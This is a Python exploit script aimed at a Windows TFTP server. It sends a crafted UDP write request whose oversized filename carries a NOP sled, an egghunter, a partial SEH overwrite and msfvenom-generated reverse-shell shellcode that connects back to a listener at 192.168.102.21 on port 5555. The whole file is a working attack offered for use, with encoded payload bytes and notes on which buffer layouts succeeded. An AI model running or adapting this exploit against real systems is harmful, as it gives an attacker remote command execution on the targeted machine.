#!/usr/bin/python
#me@tehwinsam.com
#TFTP 0 Day angle 
#Fuzzle + SEH Off + 3 Bytes overwrite (SAFE SEH with nullbytes) ON "Address POP POP RETN" + "EggHunter to shellcode"

import sys
from socket import *

UDP_IP = "192.168.102.152"
UDP_PORT = 69
opcode = "\x00\x02"

#709
#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.102.21 lport=5555 -f python -e x86/alpha_mixed
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 709 (iteration=0)
#x86/alpha_mixed chosen with final size 709
#Payload size: 709 bytes
#Final size of python file: 3396 bytes
buf =  ""
buf += "\x89\xe5\xd9\xce\xd9\x75\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
buf += "\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
buf += "\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x4a\x48\x4b\x32"
buf += "\x53\x30\x47\x70\x75\x50\x61\x70\x6b\x39\x58\x65\x56"
buf += "\x51\x79\x50\x72\x44\x6c\x4b\x36\x30\x70\x30\x4c\x4b"
buf += "\x73\x62\x54\x4c\x6e\x6b\x66\x32\x44\x54\x6c\x4b\x64"
buf += "\x32\x45\x78\x64\x4f\x4d\x67\x31\x5a\x67\x56\x74\x71"
buf += "\x39\x6f\x6c\x6c\x67\x4c\x50\x61\x51\x6c\x34\x42\x74"
buf += "\x6c\x67\x50\x4a\x61\x58\x4f\x54\x4d\x53\x31\x6a\x67"
buf += "\x6d\x32\x7a\x52\x51\x42\x51\x47\x4e\x6b\x62\x72\x42"
buf += "\x30\x6e\x6b\x63\x7a\x57\x4c\x6c\x4b\x50\x4c\x76\x71"
buf += "\x63\x48\x68\x63\x53\x78\x47\x71\x48\x51\x62\x71\x4e"
buf += "\x6b\x46\x39\x31\x30\x55\x51\x38\x53\x6c\x4b\x71\x59"
buf += "\x76\x78\x5a\x43\x66\x5a\x52\x69\x6c\x4b\x44\x74\x4c"
buf += "\x4b\x45\x51\x4b\x66\x55\x61\x4b\x4f\x6c\x6c\x49\x51"
buf += "\x5a\x6f\x56\x6d\x56\x61\x69\x57\x44\x78\x6b\x50\x62"
buf += "\x55\x4b\x46\x65\x53\x51\x6d\x58\x78\x65\x6b\x43\x4d"
buf += "\x35\x74\x31\x65\x4a\x44\x56\x38\x4e\x6b\x71\x48\x57"
buf += "\x54\x45\x51\x39\x43\x53\x56\x6e\x6b\x66\x6c\x32\x6b"
buf += "\x6e\x6b\x72\x78\x65\x4c\x47\x71\x69\x43\x6c\x4b\x44"
buf += "\x44\x6c\x4b\x36\x61\x4a\x70\x6c\x49\x42\x64\x71\x34"
buf += "\x47\x54\x61\x4b\x71\x4b\x31\x71\x43\x69\x43\x6a\x73"
buf += "\x61\x4b\x4f\x79\x70\x53\x6f\x73\x6f\x61\x4a\x6c\x4b"
buf += "\x62\x32\x7a\x4b\x4e\x6d\x33\x6d\x52\x48\x66\x53\x37"
buf += "\x42\x43\x30\x57\x70\x73\x58\x51\x67\x51\x63\x57\x42"
buf += "\x73\x6f\x31\x44\x35\x38\x42\x6c\x54\x37\x34\x66\x55"
buf += "\x57\x69\x6f\x39\x45\x58\x38\x5a\x30\x53\x31\x57\x70"
buf += "\x63\x30\x47\x59\x68\x44\x43\x64\x62\x70\x33\x58\x74"
buf += "\x69\x6f\x70\x42\x4b\x77\x70\x79\x6f\x48\x55\x36\x30"
buf += "\x46\x30\x42\x70\x76\x30\x77\x30\x46\x30\x77\x30\x70"
buf += "\x50\x55\x38\x4a\x4a\x36\x6f\x59\x4f\x39\x70\x79\x6f"
buf += "\x58\x55\x4a\x37\x52\x4a\x34\x45\x35\x38\x4b\x70\x4e"
buf += "\x48\x30\x66\x56\x75\x73\x58\x66\x62\x55\x50\x54\x55"
buf += "\x6e\x53\x4b\x39\x78\x66\x52\x4a\x64\x50\x70\x56\x56"
buf += "\x37\x35\x38\x7a\x39\x49\x35\x53\x44\x43\x51\x69\x6f"
buf += "\x6e\x35\x4f\x75\x59\x50\x70\x74\x34\x4c\x39\x6f\x50"
buf += "\x4e\x64\x48\x33\x45\x38\x6c\x42\x48\x4a\x50\x4c\x75"
buf += "\x79\x32\x63\x66\x4b\x4f\x38\x55\x55\x38\x52\x43\x72"
buf += "\x4d\x62\x44\x67\x70\x6b\x39\x58\x63\x46\x37\x70\x57"
buf += "\x43\x67\x30\x31\x5a\x56\x62\x4a\x32\x32\x30\x59\x32"
buf += "\x76\x39\x72\x4b\x4d\x51\x76\x39\x57\x42\x64\x31\x34"
buf += "\x67\x4c\x55\x51\x73\x31\x6c\x4d\x33\x74\x61\x34\x44"
buf += "\x50\x68\x46\x47\x70\x30\x44\x71\x44\x56\x30\x42\x76"
buf += "\x36\x36\x52\x76\x33\x76\x31\x46\x70\x4e\x66\x36\x31"
buf += "\x46\x30\x53\x70\x56\x65\x38\x32\x59\x68\x4c\x45\x6f"
buf += "\x6b\x36\x69\x6f\x6b\x65\x4d\x59\x6b\x50\x70\x4e\x72"
buf += "\x76\x70\x46\x79\x6f\x44\x70\x55\x38\x64\x48\x6d\x57"
buf += "\x77\x6d\x43\x50\x69\x6f\x78\x55\x4f\x4b\x68\x70\x4f"
buf += "\x45\x4d\x72\x70\x56\x73\x58\x49\x36\x4e\x75\x4f\x4d"
buf += "\x6f\x6d\x49\x6f\x38\x55\x57\x4c\x53\x36\x73\x4c\x57"
buf += "\x7a\x4f\x70\x39\x6b\x59\x70\x42\x55\x47\x75\x6d\x6b"
buf += "\x33\x77\x64\x53\x31\x62\x32\x4f\x31\x7a\x55\x50\x43"
buf += "\x63\x4b\x4f\x4e\x35\x41\x41"


#jump back 50 decimal of bytes 
nseh="\x90\x90\xeb\xcc"

egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
#EGG 32 bytes W00T
filename="\x90"* 751 + "W00TW00T" + buf + "\x90" * 20 + egghunter  + nseh + "\x4F\x48\x40"
#filename="\x90"* 751 + "W00TW00T" + buf + "\x90" * 20 + egghunter  + nseh + "\x4F\x48\x40"   || SUCCESS
#filename="\x41" * 20 + "W00TW00T" + buf  + "\x90" * 751 + egghunter  + nseh + "\x4F\x48\x40"    || FAILED
paddle="\x00"
mode="netascii"
last="\x00"

packets=opcode+filename+paddle+mode+last

try:
    s = socket(AF_INET,SOCK_DGRAM)
    try:
        s.sendto(packets, (UDP_IP, UDP_PORT))
        print "[+] Sending the evil packet !!!"
    except:
        print "[-] send() error !"
    print "[+] Done "
except:
    print "[x] Socket() error!"
